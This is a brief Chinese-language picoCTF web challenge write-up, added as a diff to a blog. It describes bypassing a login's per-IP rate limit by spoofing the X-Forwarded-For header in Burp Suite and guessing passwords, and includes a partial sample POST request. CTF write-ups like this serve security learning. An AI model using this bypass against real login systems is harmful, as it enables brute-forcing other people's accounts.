@@ -1,0 +1,32 @@
+---
+title: 'Crack the Gate 2'
+description: ''
+pubDate: '2026-04-02'
+tags: ['picoCTF', 'Web']
+category: 'WriteUp'
+---
+
+分類：Web  
+難度：Medium
+
+### 工具
+
+1. Burp Suite
+
+### 過程
+
+1. 該題限制了 IP 請求，但是可以使用封包的 `X-Forwarded-For` 標頭來繞過
+2. 所以就拿 Burp Suite 手動嘗試也可以，因為密碼嘗試還蠻少的
+
+```
+POST /login HTTP/1.1
+Host: amiable-citadel.picoctf.net:49785
+...
+X-Forwarded-For: 1.1.1.X
+
+{"email":"ctf-player@picoctf.org","password":"..."}
+```
+
+### 資源
+
+- [X-Forwarded-For](https://www.typeerror.org/docs/http/headers/x-forwarded-for)
